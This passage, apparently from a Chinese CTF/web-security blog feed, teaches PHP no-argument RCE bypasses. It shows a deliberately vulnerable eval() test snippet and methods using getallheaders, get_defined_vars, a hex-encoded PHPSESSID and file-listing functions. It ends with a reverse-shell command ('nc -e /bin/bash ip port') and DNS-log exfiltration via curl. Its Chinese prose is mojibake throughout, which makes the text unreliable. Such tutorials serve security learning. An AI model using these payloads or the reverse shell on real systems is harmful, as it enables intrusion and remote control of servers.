title="1.getallheaders()"></a>1.getallheaders()</h2><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯è·å–<code>http</code>æ‰€æœ‰çš„å¤´éƒ¨ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯<code>headers</code>ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥ç”¨<code>var_dump</code>æŠŠå®ƒæ‰“å°å‡ºæ¥ï¼Œä½†è¿™ä¸ªæœ‰ä¸ªé™åˆ¶æ¡ä»¶å°±æ˜¯å¿…é¡»åœ¨<code>apache</code>çš„ç¯å¢ƒä¸‹å¯ä»¥ä½¿ç”¨ï¼Œå…¶å®ƒç¯å¢ƒéƒ½æ˜¯ç”¨ä¸äº†çš„ï¼Œæˆ‘ä»¬åˆ°burpä¸­å»åšæ¼”ç¤º,æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);if(isset($_GET['code'])){if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {  eval($_GET['code']);}else die('nonono');}else echo('please input code');?&gt; </code></pre><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y2OTE1NzVjMzBkZGZiZGY1MzZmODY0ODk4OWNjMWFfOXQ1SnRDZ1NqTVJSaWZvOEJMZDNDYmxJSlV0SFlHNTFfVG9rZW46QkpCYmJReDR4bzZVMUd4ZDBtTmNFTEMxbkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>å¯ä»¥çœ‹åˆ°ï¼Œæ‰€æœ‰çš„å¤´éƒ¨ä¿¡æ¯éƒ½å·²ç»ä½œä¸ºäº†ä¸€ä¸ª<strong>æ•°ç»„</strong>æ‰“å°äº†å‡ºæ¥ï¼Œåœ¨å®é™…çš„è¿ç”¨ä¸­ï¼Œæˆ‘ä»¬è‚¯å®šä¸éœ€è¦è¿™ä¹ˆå¤šæ¡ï¼Œä¸ç„¶å®ƒåˆ°åº•æ‰§è¡Œå“ªä¸€æ¡å‘¢ï¼Ÿæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€‰æ‹©ä¸€æ¡å‡ºæ¥ç„¶åå°±æ‰§è¡Œå®ƒï¼Œè¿™é‡Œå°±éœ€è¦ç”¨åˆ°<code>php</code>ä¸­æ“çºµæ•°ç»„çš„å‡½æ•°äº†ï¼Œè¿™é‡Œå¸¸è§çš„æ˜¯åˆ©ç”¨<code>end()</code>å‡½æ•°å–å‡ºæœ€åä¸€ä½ï¼Œè¿™é‡Œçš„æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè€Œä¸”å®ƒåªä¼šä»¥<strong>å­—ç¬¦ä¸²</strong>çš„å½¢å¼å–å‡º<strong>å€¼</strong>è€Œä¸ä¼šå–å‡ºé”®ï¼Œæ‰€ä»¥è¯´é”®åéšä¾¿å–å°±è¡Œï¼š</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YjcwZmViOTQ5NjZlYzZkZDdlMjMyNjIyOGQ2M2VjODhfNmFYY2VGZU1oRXFNZXVYMXh2dVRxWGlWQXVybTR1dGxfVG9rZW46VkJOQ2I1UmVPb0o1QU54cE9xV2NUcjB5bjFiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>é‚£æˆ‘ä»¬æŠŠæœ€å‰é¢çš„<code>var_dump</code>æ”¹æˆ<code>eval</code>ï¼Œä¸å°±å¯ä»¥æ‰§è¡Œ<code>phpinfo</code>äº†å—ï¼Œæ¢è¨€ä¹‹ï¼Œå°±å¯ä»¥å®ç°ä»»æ„phpä»£ç çš„ä»£ç æ‰§è¡Œäº†ï¼Œé‚£åœ¨æ²¡æœ‰è¿‡æ»¤çš„æƒ…å†µä¸‹æ‰§è¡Œå‘½ä»¤ä¹Ÿå°±è½»è€Œæ˜“ä¸¾äº†ï¼Œå…·ä½“æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MmY0Yzk0MjA1MWU0MDlhNWMyODAwMTBkZDIyMzEyZTZfTHU0emMxbVBkQXJjMGo4WVhGWVoxOVQ0MDRMZmpKbVpfVG9rZW46RnBjTGJhYkM5bzZkU2p4NndQcWNOOHpmbmFnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ODYyMDRkNmUzOWFjYjMzYzdkOTlmNDJiNWZmZGI1MmNfcjdPTTJNaGRQUnMzQVk5dGF5QlVpN2ZHM1lYN2NlcjJfVG9rZW46RE1XRGJ6N1lFb3Bycnd4OUJtQmNpSFhybmtZXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h2 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars()"></a>2.get_defined_vars()</h2><p>ä¸Šé¢è¯´åˆ°äº†ï¼Œ<code>getallheaders()</code>æ˜¯æœ‰å±€é™æ€§çš„ï¼Œå› ä¸ºå¦‚æœä¸­é—´ä»¶ä¸æ˜¯<code>apache</code>çš„è¯ï¼Œå®ƒå°±ç”¨ä¸äº†äº†ï¼Œé‚£æˆ‘ä»¬å°±ä»‹ç»ä¸€ç§æ›´ä¸ºæ™®éçš„æ–¹æ³•<code>get_defined_vars()</code>ï¼Œè¿™ç§æ–¹æ³•å…¶å®å’Œä¸Šé¢é‚£ç§æ–¹æ³•åŸç†æ˜¯å·®ä¸å¤šçš„ï¼š</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YTcyMjlhMDI4YmE1Y2FjNGJhZjlmODNmZTNiZGJhZmZfaFhtY2FKVGx6TzBqVldjc3JMMzFpN3dYdkRsUWhrYW1fVG9rZW46T2ViS2JJVTUyb2l6THl4Vk81WGNpVkFBbnhmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>å¯ä»¥çœ‹åˆ°ï¼Œå®ƒå¹¶ä¸æ˜¯è·å–çš„<code>headers</code>ï¼Œè€Œæ˜¯è·å–çš„å››ä¸ªå…¨å±€å˜é‡<code>$_GET $_POST $_FILES $_COOKIE</code>ï¼Œè€Œå®ƒçš„è¿”å›å€¼æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>GET</code>æ–¹å¼ä¼ å…¥çš„å‚æ•°åœ¨ç¬¬ä¸€ä¸ªæ•°ç»„ä¸­ã€‚è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦å…ˆå°†äºŒç»´æ•°ç»„è½¬æ¢ä¸ºä¸€ç»´æ•°ç»„ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨åˆ°<code>current()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œè€Œå®ƒçš„é»˜è®¤æ˜¯ç¬¬ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬GETæ–¹å¼ä¼ å…¥çš„å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹å®é™…æ•ˆæœï¼š</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDE3NmU2OTdkM2Y4ODVlMDYwZDFlOTk0YTc3NmRmNzlfUEJkRDBXM1VEdWxpNnhyaHVPMnlZN01xQVlad2ZZVTFfVG9rZW46SldnZ2JWcm1Qb0YzYjl4d3ZHMWNQSlZWbjNlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆåŠŸè¾“å‡ºäº†æˆ‘ä»¬äºŒç»´æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼Œä¹Ÿå°±æ˜¯å°†GETçš„æ•°æ®å…¨éƒ¨è¾“å‡ºäº†å‡ºæ¥ï¼Œç›¸å½“äºå®ƒå°±å·²ç»å˜æˆäº†ä¸€ä¸ªä¸€ç»´æ•°ç»„äº†ï¼Œé‚£æŒ‰ç…§æˆ‘ä»¬ä¸Šé¢çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨<code>end()</code>å‡½æ•°ä»¥å­—ç¬¦ä¸²çš„å½¢å¼å–å‡ºæœ€åçš„å€¼ï¼Œç„¶åç›´æ¥<code>eval</code>æ‰§è¡Œå°±è¡Œäº†ï¼Œè¿™é‡Œå’Œä¸Šé¢å°±æ˜¯ä¸€æ ·çš„äº†ï¼š</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NTE2NmNjMmNkMDJmODQ5ODZmN2RmYzQyMzczYzFlMDJfM0xMWHg3OE5xVnVLVmVzc0hNOTNTRlB0WWh4R1UyUDVfVG9rZW46SU11QWJUNnNKbzNiMGV4c1djMWN5bGdUbmJkXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmM0Yzc3YWEzYTJlOTZlYjE0ZDAwMmFiMTk5ZjFjMjVfNk5pVnRYRzlpTjFvQWFJVG1vY3l2TUxKY0UyQ1hMdUdfVG9rZW46QnhKdWJQM3pxbzZpYWZ4amxSRWNpOEMwbk9oXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Q3MWE2ZDBhYWQ0YTY1NGY2OWIyMGFiYWM5Nzk5MTZfaFFMRmw1NGZBVVNoVzBqcFk3ZkREVXdzWHY1TFQ1dnFfVG9rZW46VTNUTmJtMm1wb1FlVjF4dGw0cWNQNWx3bndoXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>æ€»ç»“ä¸€ä¸‹ï¼Œè¿™ç§æ–¹æ³•å’Œç¬¬ä¸€ç§æ–¹æ³•å‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œå°±å¤šäº†ä¸€æ­¥ï¼Œå°±æ˜¯åˆ©ç”¨<code>current()</code>å‡½æ•°å°†äºŒç»´æ•°ç»„è½¬æ¢ä¸ºä¸€ç»´æ•°ç»„ï¼Œå¦‚æœå¤§å®¶è¿˜æ˜¯ä¸äº†è§£<code>current()</code>å‡½æ•°çš„ç”¨æ³•ï¼Œå¯ä»¥æ¥ç€å¾€ä¸‹çœ‹æ–‡ç« ï¼Œä¼šå…·ä½“ä»‹ç»çš„å“¦</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªä¸“é—¨é’ˆå¯¹<code>$_FILES</code>ä¸‹æ‰‹çš„æ–¹æ³•ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h2 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h2><p>è¿™ç§æ–¹æ³•å’Œå‰é¢çš„ä¹Ÿå·®ä¸å¤ªå¤šï¼Œè¿™ç§æ–¹æ³•ç®€å•æ¥è¯´å°±æ˜¯æŠŠæ¶æ„ä»£ç å†™åˆ°<code>COOKIE</code>çš„<code>PHPSESSID</code>ä¸­ï¼Œç„¶ååˆ©ç”¨<code>session_id()</code>è¿™ä¸ªå‡½æ•°å»è¯»å–å®ƒï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥ç”¨<code>eval</code>å»ç›´æ¥æ‰§è¡Œäº†ï¼Œè¿™é‡Œæœ‰ä¸€ç‚¹è¦æ³¨æ„çš„å°±æ˜¯<code>session_id()</code>è¦å¼€å¯<code>session</code>æ‰èƒ½ç”¨ï¼Œæ‰€ä»¥è¯´è¦å…ˆ<code>session_start()</code>ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆè¯•ç€æŠŠ<code>PHPSESSID</code>çš„å€¼å–å‡ºæ¥ï¼š</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZhNmMwNTczNTBjYzg1MzYwZmJiMWE4MjJiZWNjNjVfY3dMU2RKR241cFhIZnJpTFZ1YTBQdWdCTmNRcnFVZVdfVG9rZW46UzV5aWJHekdzb21GYkx4RW1qc2MybTBDbkN1XzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>ç›´æ¥å‡ºæ¥å°±æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£å°±éå¸¸å®Œç¾ï¼Œæˆ‘ä»¬å°±ä¸ç”¨å»åšä»»ä½•çš„è½¬æ¢äº†ï¼Œä½†è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œ<code>PHPSESSIID</code>ä¸­åªèƒ½æœ‰<code>A-Z a-z 0-9</code>ï¼Œ<code>-</code>ï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬è¦å…ˆå°†æ¶æ„ä»£ç 16è¿›åˆ¶ç¼–ç ä»¥åå†æ’å…¥è¿›å»ï¼Œè€Œåœ¨phpä¸­ï¼Œå°†16è¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„å‡½æ•°ä¸º<code>hex2bin</code></p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDUxM2YxNjdiNTc4YjM2MTc3OWUxMDY2YjMxYmQ5NWZfUU1jdjRlVzRlVktzNnFuVmNEYktiOHRkTk1tRGp0Yk9fVG9rZW46Tmw3Z2JwaFVGb2FCYjZ4NHFwcGNJcjV6bmIwXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjVkZmE4MmRmMWM2MTI0NWFjZTU5ZjMyODdkZjljNTVfUkFGQmZJZTJWaDJZNW1JbksyWHpybzNnYlF0WEpnNVRfVG9rZW46SWdQbmJOTzZrbzcyZXB4dlJVU2NKM2d6bm5nXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>é‚£æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æ„é€ äº†ï¼Œé¦–å…ˆæŠŠ<code>PHPSESSID</code>çš„å€¼æ›¿æ¢æˆè¿™ä¸ªï¼Œç„¶ååœ¨å‰é¢æŠŠ<code>var_dump</code>æ¢æˆ<code>eval</code>å°±å¯ä»¥æˆåŠŸæ‰§è¡Œäº†ï¼Œå¦‚å›¾ï¼š</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzE1NDM3ZGZiNDRkYThjZGQ3MzBmNTNiMGFiOTJhMTJfc2FuaTliR0hhNG1YY3dIQ1plTDE4cU5mcWdZZGswSWdfVG9rZW46SHJEQWJWYWdPbzNRclB4dXhBQmNSb2h2bnRmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>æˆåŠŸå‡ºç°<code>phpinfo</code>ï¼Œç¨³ç¨³å½“å½“ï¼Œè¿™ç§æ–¹æ³•æˆ‘è®¤ä¸ºæ˜¯æœ€å¥½çš„ä¸€ç§æ–¹æ³•ï¼Œå¾ˆå®¹æ˜“ç†è§£ï¼Œåªæ˜¯è®°å¾—è¦å°†æ¶æ„ä»£ç å…ˆ16è¿›åˆ¶ç¼–ç ä¸€ä¸‹å“¦</p><h2 id="4-phpå‡½æ•°ç›´æ¥è¯»å–æ–‡ä»¶"><a href="#4-phpå‡½æ•°ç›´æ¥è¯»å–æ–‡ä»¶" class="headerlink" title="4.phpå‡½æ•°ç›´æ¥è¯»å–æ–‡ä»¶"></a>4.phpå‡½æ•°ç›´æ¥è¯»å–æ–‡ä»¶</h2><p>ä¸Šé¢æˆ‘ä»¬ä¸€ç›´åœ¨æƒ³åŠæ³•åœ¨è¿›è¡Œrceï¼Œä½†æœ‰çš„æƒ…å†µä¸‹ç¡®å®æ— æ³•è¿›è¡Œrceæ—¶ï¼Œæˆ‘ä»¬å°±è¦æƒ³åŠæ³•ç›´æ¥åˆ©ç”¨phpå‡½æ•°å®Œæˆå¯¹ç›®å½•ä»¥åŠæ–‡ä»¶çš„æ“ä½œï¼Œ æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥ä»‹ç»è¿™äº›å‡½æ•°ï¼š</p><h3 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv"></a>1.localeconv</h3><p>å®˜æ–¹è§£é‡Šï¼šlocaleconv() å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU2NDExYzg1OWQ4NTBlYzcyMGVmOGQzYmVmMmMwOTlfbkNuVEc4RFRhdGViTHAyV3lGMWtQV04zOWlVTkFidWpfVG9rZW46WlA2eGJET2VlbzR3RzB4T3NTNWNQcWIzbnZiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>è¿™ä¸ªå‡½æ•°å…¶å®ä¹‹å‰æˆ‘ä¸€ç›´æä¸æ‡‚å®ƒæ˜¯å¹²ä»€ä¹ˆçš„ï¼Œä¸ºä»€ä¹ˆåœ¨è¿™é‡Œæœ‰ç”¨ï¼Œä½†å®è·µå‡ºçœŸçŸ¥ï¼Œæˆ‘ä»¬åœ¨æµ‹è¯•ä»£ç ä¸­å°†<code>localeconv()</code>çš„è¿”å›ç»“æœè¾“å‡ºå‡ºæ¥ï¼Œè¿™é‡Œå¾ˆç¥å¥‡çš„äº‹å°±å‘ç”Ÿäº†ï¼Œå®ƒè¿”å›çš„æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œè€Œå®ƒçš„ç¬¬ä¸€ä½å±…ç„¶æ˜¯ä¸€ä¸ªç‚¹<code>.</code>ï¼Œé‚£æŒ‰ç…§æˆ‘ä»¬ä¸Šé¢è®²çš„ï¼Œæ˜¯å¯ä»¥åˆ©ç”¨<code>current()</code>å‡½æ•°å°†è¿™ä¸ªç‚¹å–å‡ºæ¥çš„ï¼Œä½†è¿™ä¸ªç‚¹æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿç‚¹ä»£è¡¨çš„æ˜¯å½“å‰ç›®å½•ï¼é‚£å°±å¾ˆå¥½ç†è§£äº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹å®Œæˆéå†ç›®å½•çš„æ“ä½œï¼ç›¸å½“äºå°±æ˜¯<code>linux</code>ä¸­çš„<code>ls</code>ï¼Œå…·ä½“è¯·çœ‹ä¸‹å›¾ï¼š</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzBjNWFiZTUxOWRjNTc1ZmY4MWQ0ZjE5NjdkN2NmY2VfZGlrQzFkVFZ2Ykw3Y0FxWUxLS0VNTmNNbHQyTEVDVzdfVG9rZW46Ulg5NWJsaHFvb1hLOWF4bXQ1WWNGZE5BblFlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDAzMjYwNTQ3OWUyOWRjNzRlZjUyNDc4YThkZGM4NmRfMnd3UFZESXczWVBVT05FbW9RYmxKcFAyUDdBSkRJaGNfVG9rZW46QUtYUmJnRVNNb09VSm14SGI3cGNjYjBJblFmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc0NjY0MzQzYzc3MWY5NmM0YzA1MWI0NWM0MjdkMmJfM2NDekp1RnpVN3p0RWZUd2sxRU5rQlB0NDJ1TFVWM1NfVG9rZW46VHM5eGJid3VGbzdhY1N4aDc5M2NBQmdHblhjXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="2-scandir"><a href="#2-scandir" class="headerlink" title="2.scandir"></a>2.scandir</h3><p>è¿™ä¸ªå‡½æ•°å¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯åˆ—å‡ºç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFiMzQyMzcwMjUzODhlZTQ2YzE4ODdjZTcyZDQ1NzBfazhHb1paS0pwcWdyekd3YW5CTDByWlUwZFFiaXBsbnZfVG9rZW46WFJLWWJTQ2xjb2ZXeWx4d09CQmNEZlZNblYxXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="3-current-pos"><a href="#3-current-pos" class="headerlink" title="3.current(pos)"></a>3.current(pos)</h3><p>è¿™é‡Œé¦–å…ˆå£°æ˜ï¼Œ<code>pos()</code>å‡½æ•°æ˜¯<code>current()</code>å‡½æ•°çš„åˆ«åï¼Œä»–ä»¬ä¿©æ˜¯å®Œå…¨ä¸€æ ·çš„å“ˆ</p><p>è¿™ä¸ªå‡½æ•°æˆ‘ä»¬å‰é¢å·²ç»ç”¨çš„å¾ˆå¤šäº†ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯è¾“å‡ºæ•°ç»„ä¸­å½“å‰å…ƒç´ çš„å€¼ï¼Œåªè¾“å‡ºå€¼è€Œå¿½ç•¥æ‰é”®ï¼Œé»˜è®¤æ˜¯æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œå¦‚æœè¦ç§»åŠ¨å¯ä»¥ç”¨ä¸‹åˆ—æ–¹æ³•è¿›è¡Œç§»åŠ¨ï¼š</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTI1NjQxZjkzM2U2MWYzZGYyMTdlNWY3MGQ3MjQzYzFfV2lUS1VPVVkzZzl0OUlLN2I2YlFQaUlxVklkOW80WmRfVG9rZW46UUh6bGIyUUdGb0Z4TnF4QVduMWMwZVh0blZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="4-chdir"><a href="#4-chdir" class="headerlink" title="4.chdir()"></a>4.chdir()</h3><p>è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥è·³ç›®å½•çš„ï¼Œæœ‰æ—¶æƒ³è¯»çš„æ–‡ä»¶ä¸åœ¨å½“å‰ç›®å½•ä¸‹å°±ç”¨è¿™ä¸ªæ¥åˆ‡æ¢ï¼Œå› ä¸º<code>scandir()</code>ä¼šå°†è¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å’Œç›®å½•éƒ½åˆ—å‡ºæ¥ï¼Œé‚£ä¹ˆåˆ©ç”¨æ“ä½œæ•°ç»„çš„å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆç§»åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®å½•ä¸Šç„¶åç›´æ¥ç”¨<code>chdir</code>åˆ‡å°±å¥½äº†ï¼Œå¦‚æœè¦å‘ä¸Šè·³å°±è¦æ„é€ <code>chdir('..')</code></p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MWVkOWYzMWM5ZDE0NzBhYzRhYjdmZDM3OWE5MDM3ZTRfcVJ5R0t2RUtoZ3Z6Q2dJZzRYSWdjU0czb2RsVUFJdU9fVG9rZW46VVhmN2JJUHpmb0lJc3F4WEV0NWNSSUh2bkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><h3 id="5-array-reverse"><a href="#5-array-reverse" class="headerlink" title="5.array_reverse()"></a>5.array_reverse()</h3><p>å°†æ•´ä¸ªæ•°ç»„å€’è¿‡æ¥ï¼Œæœ‰çš„æ—¶å€™å½“æˆ‘ä»¬æƒ³è¯»çš„æ–‡ä»¶æ¯”è¾ƒé åæ—¶ï¼Œå°±å¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°æŠŠå®ƒå€’è¿‡æ¥ï¼Œå°±å¯ä»¥å°‘ç”¨å‡ ä¸ª<code>next()</code></p><h3 id="6-highlight-file"><a href="#6-highlight-file" class="headerlink" title="6.highlight_file()"></a>6.highlight_file()</h3><p>æ‰“å°è¾“å‡ºæˆ–è€…è¿”å› filename æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç ï¼Œç›¸å½“äºå°±æ˜¯ç”¨æ¥è¯»å–æ–‡ä»¶çš„</p><h2 id="æ— å›æ˜¾RCE"><a href="#æ— å›æ˜¾RCE" class="headerlink" title="æ— å›æ˜¾RCE"></a>æ— å›æ˜¾RCE</h2><h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h4><p>æ¡ä»¶ï¼šå…·æœ‰nc</p><p>å‘½ä»¤</p><p> nc -e /bin/bash ip port</p><p>ç„¶åå†åœ¨æœåŠ¡å™¨ä¸Šå¼€å¯ç«¯å£æ¥å¬</p><h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><p>å‘èµ·ä¸€ä¸ªdnsè¯·æ±‚éœ€è¦é€šè¿‡linuxä¸­çš„<code>ping</code>å‘½ä»¤æˆ–è€…<code>curl</code>å‘½ä»¤</p><p>ç„¶åè¿™é‡Œä¸€ä¸ªdnslogçš„åˆ©ç”¨å¹³å°ï¼šceye <a href="http://ceye.io/">http://ceye.io/</a></p><p>ä½œä¸ºå‘½ä»¤çš„åˆ†éš”ç¬¦ï¼Œç„¶åå‘èµ·<code>curl</code>è¯·æ±‚ï¼Œç„¶åæœ€åç”¨åå¼•å·æ‰§è¡Œå‘½ä»¤</p><h4 id="æ–‡ä»¶ä¸‹è½½"><a href="#æ–‡ä»¶ä¸‹è½½" class="headerlink" title="æ–‡ä»¶ä¸‹è½½"></a>æ–‡ä»¶ä¸‹è½½</h4><p>ç‰¹å®šæƒ…å†µä¸‹å‹ç¼©flagæ–‡ä»¶,å¹¶è®¿é—®</p>]]></content>
      
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> åŸºç¡€æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptçš„åŸå‹é“¾æ±¡æŸ“</title>
      <link href="/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="jsåŸå‹é“¾æ±¡æŸ“"><a href="#jsåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="jsåŸå‹é“¾æ±¡æŸ“"></a>jsåŸå‹é“¾æ±¡æŸ“</h1><h2 id="åŸºç¡€æ¦‚å¿µè¾¨æ"><a href="#åŸºç¡€æ¦‚å¿µè¾¨æ" class="headerlink" title="åŸºç¡€æ¦‚å¿µè¾¨æ"></a>åŸºç¡€æ¦‚å¿µè¾¨æ</h2><h3 id="åŸå‹"><a href="#åŸå‹" class="headerlink" title="åŸå‹"></a><strong>åŸå‹</strong></h3><p>jsä¸­ä¸€åˆ‡çš†å¯¹è±¡,jsçš„æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªå±æ€§åŸå‹ï¼ˆprototypeï¼‰ï¼ŒåŸå‹æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå› æ­¤è¯¥åŸå‹ä¹Ÿæœ‰ä¸€ä¸ªprototypeæŒ‡å‘ä¸Šå±‚åŸå‹ï¼Œç›´åˆ°ä¸ºnullï¼Œè¿™æ 